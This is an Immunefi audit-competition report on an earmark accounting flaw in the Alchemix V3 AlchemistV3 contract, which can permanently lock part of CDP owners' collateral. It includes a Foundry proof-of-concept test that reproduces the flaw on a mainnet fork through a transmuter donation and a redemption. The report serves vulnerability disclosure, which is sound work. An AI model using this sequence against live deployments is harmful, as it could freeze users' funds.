# 57587 sc critical earmark reduction of transmuterdifference does not always account for the full transmuter balance diff which can cause permanent earmark to accrue in alchemist

**Submitted on Oct 27th 2025 at 11:14:17 UTC by @niroh for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57587
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Permanent freezing of funds

## Description

## Brief/Intro

The \_earmark() function subtracts any increases in Transmuter coverage from the current amount to be earmarked. This is done so that redemption amounts that can be covered by the transmuter are not earmarked unnecessarily. The Transmuter collateral increase is reduced from the currently earmarked amount (up to the full amount) and the lastTransmuterTokenBalance state is updated to the current balance. See code below:

```solidity
 // Yield the transmuter accumulated since last earmark (cover)
uint256 transmuterCurrentBalance = TokenUtils.safeBalanceOf(myt, address(transmuter));
uint256 transmuterDifference = transmuterCurrentBalance > lastTransmuterTokenBalance ? transmuterCurrentBalance - lastTransmuterTokenBalance : 0;

uint256 amount = ITransmuter(transmuter).queryGraph(lastEarmarkBlock + 1, block.number);

// Proper saturating subtract in DEBT units
uint256 coverInDebt = convertYieldTokensToDebt(transmuterDifference);
amount = amount > coverInDebt ? amount - coverInDebt : 0;

lastTransmuterTokenBalance = transmuterCurrentBalance;
```

## Vulnerability Details

The problem occurs because, while the amount of transmuterDifference accounted for is capped by the new earmarked amount in the current call, the lastTransmuterTokenBalance is updated to the full current balance. This means any transmuterDifference amount not accounted for in the current call will never be accounted for.

This may result in an amount of earmark reserved in Alchemist that is redundant and never cleared, causing part of CDP owners collateral to remain permanently and unnecessarily locked.

Consider for following scenario:

1. Starting state: Alchemist has 100 debt, 0 earmark, no redemptions created or vested.
2. An amount of 50 collateral tokens (worth 50 debt tokens) is sent to the transmuter directly.
3. At the next \_earmark() call (following a poke() for example) transmuterDifference is X, but since no new earmark is added in the call, it is not reduced from earmark. The lastTransmuterTokenBalance is updated to X.
4. A redemption is created for 50 debt tokens
5. As timeToTransmute elapses, 50 debt tokens are earmarked for the redemption
6. When the redemption matures the redeemer calls claim redemption, and transmuter pays the entire redemption from its collateral coverage.
7. The 50 debt tokens earmarked for the redemption are therefore not cleared and remain in the system indefinitely, blocking CDP owners from fully withdrawing their collateral.

## Impact Details

Permanent freezing of part of CDP owners collateral due to the redundant earmark

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L1098>

## Proof of Concept

## Proof of Concept

How to run:

1. Copy the code below into the IntegrationTest contract is tes/IntergrationTest.t.sol
2. Run with FOUNDRY\_PROFILE=default forge test --fork-url <https://mainnet.gateway.tenderly.co> --match-test testEarmarkTransmuterIncreasePOC -vvv --evm-version cancun

```solidity
function ClaimResdemptionTransmuter(address user) internal {
        vm.startPrank(user);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(transmuterLogic));
        transmuterLogic.claimRedemption(tokenId);
        vm.stopPrank();

    }

    function depositToAlchemix(uint256 shares, address user) internal {
        vm.startPrank(user);
        IERC20(address(vault)).approve(address(alchemist),shares);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        alchemist.deposit(shares,user, tokenId);
        
        vm.stopPrank();
    }

     function MintOnAlchemix(uint256 toMint, address user) internal {
         vm.startPrank(user);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        assertGt(tokenId,0,"cannot mint to user with no positions");
        alchemist.mint(tokenId, toMint, user);
        vm.stopPrank();
    }

    function RedeemOnTransmuter(address user, uint256 debtAmount) internal {
        vm.startPrank(user);

        IERC20(alUSD).approve(address(transmuterLogic), debtAmount);
        transmuterLogic.createRedemption(debtAmount);

        vm.stopPrank();

    }

    function moveTime(uint256 blocks) internal {
        vm.warp(block.timestamp+blocks*12);
        vm.roll(block.number+blocks);
    }

        function printState(address user, string memory message) internal {
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        //poke to refresh _earmark and sync
        alchemist.poke(tokenId);
        uint256 totalDebt = alchemist.totalDebt();
        uint256 synthIssued = alchemist.totalSyntheticsIssued();
        uint256 transmuterCollBalance = IERC20(address(alchemist.myt())).balanceOf(address(transmuterLogic));
        uint256 transmuterDebtCoverage = alchemist.convertYieldTokensToDebt(transmuterCollBalance);
        uint256 transmuterLocked = transmuterLogic.totalLocked();
        
        (uint256 collateral, uint256 debt, uint256 earmarked) = alchemist.getCDP(tokenId);
        uint256 alchemistCollBalance = IERC20(address(alchemist.myt())).balanceOf(address(alchemist));
        uint256 alchemistCollInDebt = alchemist.convertYieldTokensToDebt(alchemistCollBalance);
        console.log("%s",message);
        console.log("Alchemist Total Debt: %s",totalDebt/1e18);
        console.log("Alchemist cumulative earmarked: %s", alchemist.cumulativeEarmarked() / 1e18);
        console.log("Alchemist getTotalUnderlyingValue (_mytSharesDeposited value in debt tokens)", alchemist.getTotalUnderlyingValue()/1e6);
        console.log("Alchemist Actual Collateral balance value in debt tokens", alchemistCollInDebt / 1e18);
        console.log("Transmuter Debt Coverage (collateral balance value in debt tokens): %s",transmuterDebtCoverage/1e18);
        console.log("Transmuter Locked Synthetic tokens: %s",transmuterLocked/1e18);
        console.log("Total Synthetic token Issuance: %s",synthIssued/1e18);
        
        console.log("CDP info -  collateral: %s, debt %s, earmarked %s\n\n", collateral/1e18,  debt/1e18,  earmarked/1e18);
        
    }

    function testEarmarkTransmuterIncreasePOC() public {
        address bob = makeAddr("bob");
        address redeemer1 = makeAddr("redeemer1");


        //deposit 300 underlying to vault 
        uint256 sharesBob = _magicDepositToVault(address(vault), bob, 300e6);

        //deposit 115 vault shares to alchemix
        uint256 depositedCollateral = 115e18;
        depositToAlchemix(depositedCollateral, bob);

        //mint a debt of 100
        uint256 mintAmount = 100e18;
        MintOnAlchemix(mintAmount,bob);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(bob, address(alchemistNFT));

        //transfer 50 to redeemer
        vm.startPrank(bob);
        IERC20(alUSD).transfer(redeemer1, mintAmount /2);
        vm.stopPrank();

        //donation of 50 coll tokens to Transmuter
        vm.startPrank(bob);
        vault.transfer(address(transmuterLogic), 50e18);
        vm.stopPrank();

        //create, vest and redeem
        RedeemOnTransmuter(redeemer1, mintAmount / 2);
        moveTime(transmuterLogic.timeToTransmute());
        ClaimResdemptionTransmuter(redeemer1);

         printState(bob,"System final state");
         /* OUTPUT:
            System final state
            Alchemist Total Debt: 100
            Alchemist cumulative earmarked: 50
            Alchemist getTotalUnderlyingValue (_mytSharesDeposited value in debt tokens) 115
            Alchemist Actual Collateral balance value in debt tokens 115
            Transmuter Debt Coverage (collateral balance value in debt tokens): 0
            Transmuter Locked Synthetic tokens: 0
            Total Synthetic token Issuance: 50
            CDP info -  collateral: 115, debt 100, earmarked 50

            Note: even though the redemption was claimed (Issuance: 50, Transmuter Locked Synthetic: 0) The system and CDP still hold a debt of 100 and an earmark of 50
            
         */

    }
```
